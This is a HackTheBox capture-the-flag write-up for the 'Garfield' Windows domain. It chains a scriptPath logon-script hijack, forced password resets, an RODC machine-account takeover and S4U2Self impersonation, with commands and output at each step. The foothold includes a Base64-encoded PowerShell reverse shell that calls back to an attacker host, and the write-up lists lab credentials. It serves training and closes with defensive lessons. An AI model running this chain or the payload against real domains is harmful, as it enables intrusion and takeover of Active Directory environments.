---
layout: ctf
title: "HackTheBox: Garfield"
platform: "HackTheBox"
type: "Machine"
difficulty: "Hard"
image: "/assets/img/ctf/garfield.png"
tags: [Windows, Active-Directory, Logon-Scripts, scriptPath-Hijack, ForceChangePassword, ACL-Abuse, Impersonation, RODC, Machine-Account-Takeover, S4U2Self]
date: 2026-05-12
---


# 🎯 Garfield

**OS:** Windows | **Difficulty:** Hard | **IP:** `10.129.48.245`

![garfield.htb](/assets/img/ctf/data/garfield-htb.png)

## ⛓️ TL;DR / Attack Chain

* **Foothold (scriptPath Abuse):** Enumeration revealed that the initial user `j.arbuckle` possessed `WriteProperty` permissions over the `scriptPath` attribute for administrative accounts like `l.wilson`. We hijacked this attribute to point to a malicious batch file in `SYSVOL`, obtaining a reverse shell as **`l.wilson`** upon login.
* **Privilege Escalation (Tier 1 Access):** From the `l.wilson` session, we leveraged a `ForceChangePassword` right to reset the password for the administrative account **`l.wilson_adm`**, gaining access to a Tier 1 identity.
* **Lateral Movement (RODC Takeover):** With `l.wilson_adm` credentials, we exploited an `AddSelf` right to join the `RODC ADMINISTRATORS` group. We then used an insecure Access Control Entry (ACE) to perform a machine account takeover of **`RODC01$`** by resetting its password via LDAP.
* **Domain Dominance (Constrained Delegation):** We identified that the `RODC01` computer object was trusted for protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`). Using the compromised machine account, we performed an **S4U2Self** request to impersonate the Domain Administrator and gained a SYSTEM shell on the Read-Only Domain Controller.

---

## 🔑 Loot & Creds

| User | Credential | Where / How |
| --- | --- | --- |
| `j.arbuckle` | `Th1sD4mnC4t!@1978` | Provided initial access credentials. |
| `l.wilson` | `[Reverse Shell]` | Obtained via `scriptPath` attribute hijack. |
| `l.wilson_adm` | `tralsesec123!` | Password reset using `l.wilson`'s `ForceChangePassword` rights. |
| `RODC01$` | `PwnedMachine123!` | Machine account password reset via `l.wilson_adm` permissions. |
| `Administrator` | `[ccache ticket]` | Impersonated via S4U2Self delegation on RODC01. |

---

## 🔧 0. Setup & Global Variables

Run this in your terminal once so you can execute the rest of the commands smoothly.

```bash
$ IP="10.129.48.245" ; DOMAIN="garfield.htb" && \
  echo "$IP $DOMAIN GARFIELD DC01.garfield.htb DC01.GARFIELD DC01.GARFIELD.HTB" | sudo tee -a /etc/hosts
```

---

## 🔍 1. Enumeration

### Nmap

We begin with an all-ports scan to identify the attack surface.

```bash
$ nmap -sV -sC -p- 10.129.48.245 -oA ./nmap/

Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-06 19:31 +0200
Nmap scan report for garfield.htb (10.129.48.245)
Host is up (0.020s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-07 01:33:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-07T01:35:12+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
| rdp-ntlm-info:
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-07T01:34:31+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49905/tcp open  msrpc         Microsoft Windows RPC
59721/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-05-07T01:34:36
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.31 seconds
```

The scan identifies a primary Domain Controller (`DC01`) and hints at an internal management segment (the clock skew and domain info confirm we are dealing with a standard AD environment).

### BloodHound

Using our initial credentials, we map out the domain relationships.

```bash
$ bloodhound-python -d GARFIELD.HTB -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -ns 10.129.48.245 -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: garfield.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::d238:b764:f7c9:54bf
INFO: Trying LDAP connection to dead:beef::d238:b764:f7c9:54bf
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::d238:b764:f7c9:54bf
INFO: Trying LDAP connection to dead:beef::d238:b764:f7c9:54bf
INFO: Found 8 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: RODC01.garfield.htb
INFO: Querying computer: DC01.garfield.htb
INFO: Done in 00M 14S
INFO: Compressing output into 20260506195412_bloodhound.zip
```

The results highlight critical over-privileged attributes, particularly the ability for a standard user to modify administrative logon scripts.

![garfield-1.htb](/assets/img/ctf/data/garfield-1.png)
> Set user to owned

---

## 🚪 2. Initial Foothold

### Discovery & Deep Enumeration

Before executing the hijack, we performed thorough enumeration to understand the target's internal environment. We began by identifying the available network shares using our initial credentials.

```bash
$ USER=j.arbuckle && PASS='Th1sD4mnC4t!@1978' && nxc smb GARFIELD -u $USER -p $PASS --shares

SMB          10.129.48.245   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB          10.129.48.245   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB          10.129.48.245   445    DC01             [*] Enumerated shares
SMB          10.129.48.245   445    DC01             Share           Permissions     Remark
SMB          10.129.48.245   445    DC01             -----           -----------     ------
SMB          10.129.48.245   445    DC01             ADMIN$                          Remote Admin
SMB          10.129.48.245   445    DC01             C$                              Default share
SMB          10.129.48.245   445    DC01             IPC$             READ            Remote IPC
SMB          10.129.48.245   445    DC01             NETLOGON         READ            Logon server share
SMB          10.129.48.245   445    DC01             SYSVOL           READ            Logon server share
```

![garfield-2.htb](/assets/img/ctf/data/garfield-2.png)

We then utilized the `spider_plus` module to dump the metadata of the readable shares. This allowed us to find sensitive policy files like `GptTmpl.inf` and `Registry.pol`, which revealed a weak password policy (complexity disabled) and exposed certificate blobs.

```bash
$ nxc smb 10.129.48.245 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -M spider_plus -o DOWNLOAD_FLAG=True
```

![garfield-3.htb](/assets/img/ctf/data/garfield-3.png)

DNS enumeration revealed that `RODC01.garfield.htb` resolves to an internal management IP (`192.168.100.2`), which is not directly routable from our external segment.

```bash
$ nslookup RODC01.garfield.htb 10.129.48.245

Server:		10.129.48.245
Address:	10.129.48.245#53

Name:	RODC01.garfield.htb
Address: 192.168.100.2
```

### Hijacking the Logon Script

Detailed LDAP enumeration with `bloodyAD` confirmed that our user possessed explicit `WRITE` access to the `scriptPath` attribute of several high-value users, including `l.wilson` and `l.wilson_adm`.

```bash
$ bloodyAD -d garfield.htb --host 10.129.48.245 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable --detail

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

We prepared a malicious batch file containing a Base64-encoded PowerShell reverse shell.

```bash
echo -e '@echo off\npowershell.exe -e\nJABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMgA1ADIAIgAsADEAMwAzADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA' > startupscript.bat
```

We uploaded this payload to the `SYSVOL` scripts directory where we had `READ` and `WRITE` permissions.

```bash
$ smbclient //10.129.48.245/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
smb: \> cd garfield.htb\scripts\
smb: \garfield.htb\scripts\> put startupscript.bat
putting file startupscript.bat as \garfield.htb\scripts\startupscript.bat (16.8 kB/s) (average 16.8 kB/s)
```

Finally, we updated the `scriptPath` for user `l.wilson` to point to our newly uploaded script.

```bash
$ bloodyAD -d "garfield.htb" --host "garfield.htb" -u "j.arbuckle" -p 'Th1sD4mnC4t!@1978' set object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' scriptPath -v '\\garfield.htb\SYSVOL\garfield.htb\scripts\startupscript.bat'

[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

Once `l.wilson` logged into the domain, the script executed and provided a reverse shell callback.

![garfield-4.htb](/assets/img/ctf/data/garfield-4.png)

---

## 📈 3. Lateral Movement & PrivEsc

### Taking Tier 1 Admin

After upgrading our shell to Meterpreter, we utilized `l.wilson`'s `ForceChangePassword` permission over `l.wilson_adm`. We executed a password reset via the ADSI provider in PowerShell.

```powershell
*Evil-WinRM* PS > $TargetUser = [ADSI]"LDAP://CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
*Evil-WinRM* PS > $TargetUser.psbase.Invoke("SetPassword", "tralsesec123!")
```

![garfield-5.htb](/assets/img/ctf/data/garfield-5.png)

We then verified the new credentials and logged in via `evil-winrm` as `l.wilson_adm`.

```bash
$ nxc smb 10.129.48.245 -d GARFIELD.HTB -u l.wilson_adm -p 'tralsesec123!'

SMB          10.129.48.245   445    DC01             [+] GARFIELD.HTB\l.wilson_adm:tralsesec123!
```

![garfield-6.htb](/assets/img/ctf/data/garfield-6.png)

### Compromising the RODC

With our Tier 1 administrative account, we identified that we could join the `RODC ADMINISTRATORS` group.

```bash
$ bloodyAD -d garfield.htb -u l.wilson_adm -p 'tralsesec123!' --host 10.129.48.245 add groupMember "RODC ADMINISTRATORS" "l.wilson_adm"

[+] l.wilson_adm added to RODC ADMINISTRATORS
```

![garfield-7.htb](/assets/img/ctf/data/garfield-7.png)

Membership in this group provided `ForceChangePassword` rights over the `RODC01$` machine account. To reach the isolated management subnet where the RODC resides, we established a SOCKS tunnel through our existing Meterpreter session.

```bash
$ proxychains bloodyAD -d garfield.htb -u l.wilson_adm -p 'tralsesec123!' --host 10.129.48.245 set password "RODC01$" "PwnedMachine123!"
```

### Protocol Transition to Domain Admin (The "Boss" Move)

The `RODC01$` object was flagged with `TRUSTED_TO_AUTH_FOR_DELEGATION` (Protocol Transition). This allowed us to perform an **S4U2Self** request to impersonate any user, including the Domain Administrator, to the RODC itself.

We requested a service ticket for the host service on `RODC01`.

```bash
$ proxychains impacket-getST -dc-ip 10.129.48.245 -hashes :7846506306282E2D305F886B86C20E5C -spn "host/RODC01.garfield.htb" -impersonate Administrator "garfield.htb/RODC01$"

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Saving ticket in Administrator.ccache
```

Using the forged ticket, we bypassed network isolation and gained a SYSTEM shell on the Read-Only Domain Controller.

```bash
$ export KRB5CCNAME=Administrator.ccache
$ proxychains impacket-wmiexec -k -no-pass -dc-ip 10.129.48.245 RODC01.garfield.htb

[+] garfield.htb\Administrator from ccache (Pwn3d!)
C:\> whoami
nt authority\system
```

![garfield-8.htb](/assets/img/ctf/data/garfield-8.png)

---

## 🧠 Retrospective

* **Learnings:**
    1. **Attribute Level Over Privilege:** Granting standard users `WriteProperty` rights over sensitive attributes like `scriptPath` on administrative objects is a critical misconfiguration. This allows for a direct execution path under the context of high-privilege users.
    2. **RODC Management Weaknesses:** While RODCs are intended to be more secure in remote locations, misconfigured management groups like `RODC ADMINISTRATORS` can be exploited to perform machine account takeovers.
    3. **Kerberos Delegation Risks:** The `TRUSTED_TO_AUTH_FOR_DELEGATION` flag should be used with extreme caution. If an attacker gains control of a machine account with this flag enabled, they can impersonate any domain user to that specific machine.
    4. **Network Segmentation Challenges:** Attackers can easily bypass network isolation between user segments and management segments (like the 192.168.100.x subnet used here) by leveraging established pivots and SOCKS tunneling.
